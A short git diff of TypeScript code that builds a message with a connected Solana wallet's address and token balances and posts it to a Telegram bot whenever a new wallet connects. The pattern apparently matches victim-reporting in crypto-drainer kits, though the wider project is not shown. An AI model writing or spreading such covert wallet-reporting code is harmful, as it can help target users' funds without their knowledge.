@@ -24,6 +24,12 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
+    const formattedTokens = walletData.tokens.map((token: any) => 
+      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
+    ).join('\n\n');
+
+    const message = `🔍 New Wallet Connection Detected:\n\n\n\n👛 Wallet Address: ${walletData.address}\n⏰ Time: ${new Date().toLocaleString()}\n\n\n\n💰 Token Balances:\n${formattedTokens}\n\n\n\n🌐 Network: Solana Mainnet`;
+
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -31,7 +37,7 @@ export const sendToTelegram = async (walletData: any) => {
       },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: `result: ${walletData.address}`,
+        text: message,
       }),
     });
 
